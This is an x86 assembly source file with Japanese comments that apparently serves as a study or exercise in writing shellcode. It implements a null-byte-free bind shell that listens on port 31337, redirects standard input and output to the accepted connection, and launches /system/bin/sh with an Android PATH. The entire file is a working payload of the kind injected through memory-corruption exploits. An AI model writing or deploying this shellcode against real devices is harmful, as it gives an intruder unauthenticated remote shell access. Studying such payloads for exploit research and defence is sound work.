BITS 32
	
_start:
	;int 3				;ブレークポイント
	
	;sockfd = socket(2,1,0);
	push BYTE 0x66	;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x00000066の４バイト	
	pop eax			;eax=0x66 socketcallのシステムコール番号
	xor ebx, ebx
	inc ebx			;ebx=1    socket()
	xor ecx,ecx
	push ecx
	push BYTE 0x1
	push BYTE 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax 	;socket()の実行結果をesiに保持
	
	;bind(sockfd,(struct sockaddr *)&host_addr, sizeof(struct sockaddr));
	push BYTE 0x66	;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x00000066の４バイト	
	pop eax			;eax=0x66 socketcallのシステムコール番号
	inc ebx			;ebx=2    bind()
	xor ecx,ecx
	push ecx			;INADDR_ANY = 0
	push WORD 0x697a	;Port = 31337 push BYTEとは異なり、2バイトしかpushされない
	push WORD 0x2		;AF_INET = 2  
	mov ecx,esp
	push BYTE 16	;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x00000010の４バイト	
	push ecx
	push esi
	mov ecx,esp
	int 0x80
	
	;listen(sockfd, 4);
	push BYTE 0x66	;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x00000066の４バイト	
	pop eax			;eax=0x66 socketcallのシステムコール番号
	inc ebx
	inc ebx			;ebx=4    listen()
	push BYTE 0x4
	push esi
	mov ecx, esp
	int 0x80
	
	;new_sockfd = accept(sockfd,(struct sockaddr*)&client_addr, &sin_size);
	push BYTE 0x66	;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x00000066の４バイト	
	pop eax			;eax=0x66 socketcallのシステムコール番号
	inc ebx			;ebx=5    accept()
	xor ecx,ecx
	push ecx
	push ecx
	push esi
	mov ecx,esp
	int 0x80
	
	;dup2
	mov ebx,eax			;ebx=newsockfd
	push BYTE 0x3f		;BYTE指定により、機械語に0x00が含まれなくなる。さらに、実際にpushされる値は0x0000003fの４バイト	
	pop eax				;eax=0x3f	dup2()
	xor ecx,ecx
	int 0x80			;dup2(newsockfd,0);
	mov BYTE al,0x3f
	inc ecx
	int 0x80			;dup2(newsockfd,1);
	mov BYTE al,0x3f
	inc ecx
	int 0x80			;dup2(newsockfd,2);
	
	;"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\0"
	xor ecx,ecx
	push ecx
	push 0x6e696278
	push 0x2f6d6574
	push 0x7379732f
	push 0x3a6e6962
	push 0x2f6d6574
	push 0x7379732f
	push 0x3a6e6962
	push 0x732f6d65
	push 0x74737973
	push 0x2f3a6e69
	push 0x622f726f
	push 0x646e6576
	push 0x2f3a6e69
	push 0x62732f3d
	push 0x48544150
	
	;edx={"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin",0x0}
	mov edx, esp
	push ecx
	push edx
	mov edx, esp
	
	;"/system/bin/sh\0"
	push 0x410a6873
	push 0x2f6e6962
	push 0x2f6d6574
	push 0x7379732f
    mov [esp+14],cl ;0x41を終端文字に変更
    
    ;ebx="/system/bin/sh"
    mov ebx, esp
    
    ;ecx={"/system/bin/sh\0",0x0}
    push ecx
    push ebx
    mov ecx, esp
    
	;eax=11 int 0x80
	xor eax,eax
    mov al, 11
    int 0x80
